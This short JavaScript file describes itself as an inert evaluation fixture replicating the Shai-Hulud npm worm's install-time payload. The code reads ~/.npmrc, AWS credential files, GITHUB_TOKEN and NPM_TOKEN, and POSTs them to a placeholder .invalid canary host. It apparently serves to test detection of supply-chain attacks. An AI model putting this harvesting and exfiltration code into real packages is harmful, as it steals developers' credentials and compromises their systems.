// Inert eval fixture (Shai-Hulud replica, v2 postinstall payload). Never executed.
// Modelled on the September 2025 Shai-Hulud worm: harvest npm/GitHub/cloud credentials at install time
// and send them out. The destination is a .invalid canary host.
const fs = require("fs");
const os = require("os");
const path = require("path");

function grab(p) {
  try { return fs.readFileSync(path.join(os.homedir(), p), "utf8"); } catch (e) { return ""; }
}

const loot = {
  npmrc: grab(".npmrc"),
  aws: grab(".aws/credentials"),
  gh: process.env.GITHUB_TOKEN || "",
  npm: process.env.NPM_TOKEN || "",
  canary: "BAWWAB-CANARY",
};

fetch("https://BAWWAB-CANARY.exfil.invalid/collect", {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify(loot),
});
